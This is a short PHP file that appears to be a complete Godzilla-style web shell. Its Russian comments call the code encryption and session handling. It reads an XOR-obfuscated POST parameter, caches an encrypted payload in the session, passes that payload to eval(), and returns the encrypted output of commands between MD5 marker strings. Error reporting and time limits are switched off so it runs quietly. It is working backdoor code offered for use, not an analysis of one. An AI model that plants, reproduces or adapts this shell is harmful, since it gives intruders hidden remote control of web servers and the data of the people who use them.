<?php
// Начало сессии
@session_start();
// Установка времени выполнения
@set_time_limit(0);
// Отключение сообщений об ошибках
@error_reporting(0);
// Функция для шифрования данных
function process_data($data_stream, $encryption_key){
    // Итерация по каждому символу
    for($i=0; $i<strlen($data_stream); $i++) {
        // Выбор ключа
        $key_char = $encryption_key[$i+1&15];
        // XOR операция
        $data_stream[$i] = $data_stream[$i]^$key_char;
    }
    // Возврат результата
    return $data_stream;
}
// Параметр аутентификации
$auth_key = base64_decode('d29sZnNoZWxs');
// Идентификатор сессии
$storage_key = base64_decode('cGF5bG9hZA==');
// Секретный ключ
$master_key = '3c6e0b8a9c15224a';
// Проверка наличия POST-запроса
if (isset($_POST[$auth_key])){
    // Декодирование входных данных
    $input_data = process_data(base64_decode($_POST[$auth_key]), $master_key);
    // Проверка наличия данных в сессии
    if (isset($_SESSION[$storage_key])){
        // Получение данных из сессии
        $session_data = process_data($_SESSION[$storage_key], $master_key);
        // Проверка содержимого
        if (strpos($session_data, base64_decode('Z2V0QmFzaWNzSW5mbw==')) === false){
            // Повторное шифрование
            $session_data = process_data($session_data, $master_key);
        }
        // Выполнение кода
		eval($session_data);
        // Вывод первой части хеша
        echo substr(md5($auth_key.$master_key), 0, 16);
        // Вывод зашифрованного результата
        echo base64_encode(process_data(@run($input_data), $master_key));
        // Вывод второй части хеша
        echo substr(md5($auth_key.$master_key), 16);
    } else {
        // Проверка на команду инициализации
        if (strpos($input_data, base64_decode('Z2V0QmFzaWNzSW5mbw==')) !== false){
            // Сохранение данных в сессию
            $_SESSION[$storage_key] = process_data($input_data, $master_key);
        }
    }
}
